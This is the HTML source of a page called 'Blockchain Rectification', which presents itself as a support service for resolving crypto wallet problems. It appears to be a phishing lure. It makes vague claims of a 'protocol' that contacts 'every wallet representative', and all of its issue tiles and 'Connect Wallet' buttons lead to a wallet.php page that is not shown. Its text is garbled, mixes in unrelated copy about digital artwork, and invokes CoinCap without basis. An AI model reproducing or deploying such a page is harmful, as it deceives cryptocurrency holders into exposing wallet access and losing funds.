...
<head>
    ...
    <!-- site metas -->
    <title>Blockchain Rectification - We are here to help you resolve your crypto related issues</title>
	<link rel="shortcut icon" type="image/x-icon" href="bitcypo/images/favicon.ico"/>
        ...
        <div class="head-top">
            <div class="container-fluid">
                <div class="row d_flex">
                    <div class="col-sm-3">
                        <div class="logo">
                            <a href="index.php">SupportTM</a></b>BY <img src="images/coincap.png" alt="img" width="100" height="69"><font color="white" size"10"></font>
                        </div>
                    </div>
                    <div class="col-sm-5">
                                        ...
                                        <div class="row d_flex">
                                            ...
                                            <div class="col-md-6">
                                                <div class="bluid">
                                                    ...
                                                    <p>Every digital artwork on Upside is authentic and truly unique. Blockchain technology makes this new approach to digital ownership possible.
...
It is an online server which gets you across to every wallet representative to enable effective complain and rectification of issues.
                                                    ...
                                                    <a class="read_more" href="wallet.php">Connect Wallet </a>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
...
It is an online server which gets you across to every wallet representative to enable effective complain and rectification of issues.
    ...
    <div class="wallet"><Font size="5" color="#ffffff">Make Your Selection Below:</font></br>
        <div class="container-fluid">
            <div class="row">
                <div class="col-lg-3 col-sm-6">
                    <div id="wa_hover" class="wallet_box text_align_center">
                        <i><a href="wallet.php"><img src="images/wa1.svg" alt=""/></i> 
                        <h3>MIGRATION ISSUES/ASSETS RECOVERY</h3>
                        <p>Click here for migration related issues or Assets recovery issues</p>
                    </div>
                </div>
                <div class="col-lg-3 col-sm-6">
                    <div id="wa_hover" class="wallet_box text_align_center">
                        <i><a href="wallet.php"><img src="images/wa2.svg" alt=""/></i> 
                        <h3>GENERAL ISSUES</h3>
                        <p>Click here for general related issues.</p>
                    </div>
                </div>
                <div class="col-lg-3 col-sm-6">
                    <div id="wa_hover" class="wallet_box text_align_center">
                        <i><a href="wallet.php"><img src="images/wa3.svg" alt=""/></i> 
                        <h3>RECTIFICATION/SLIPPAGE Error</h3>
                        <p>Click here to rectify issues or slippage related error during trade.
 </p>
                    </div>
                </div>
                <div class="col-lg-3 col-sm-6">
                    <div id="wa_hover" class="wallet_box text_align_center">
                        <i><a href="wallet.php"><img src="images/wa4.svg" alt=""/></i> 
                        <h3>TRANSACTION ERROR /Deposits & Withdrawals</h3>
                        <p>Click here for transaction Error or Deposits & related issues.</p>
                    </div>
                        ...
                        <div class="row">
                            <div class="col-md-6">
                                ...
                                <div class="about_text">
                                    <p>Every digital artwork on Upside is authentic and truly unique. Blockchain technology makes this new approach to digital ownership possible. Open and decentralized protocol for syncing various Wallets issues on Secure Server. This is not an app but a protocol that establishes a remote resolution between all noncustodial wallet It is an online server which gets you across to every wallet representative to enable effective complain and rectification of issues. </p>
    ...
    <footer>          
            ...
            <div class="copyright text_align_center ">
               <div class="container ">
                  <div class="row ">
                     <div class="col-md-12 ">
                        <p>© 2024 All Rights Reserved. Power by   <a href="#">BlockChain & Coincap</a></p>
                     </div>
                  </div>
               </div>
            </div>
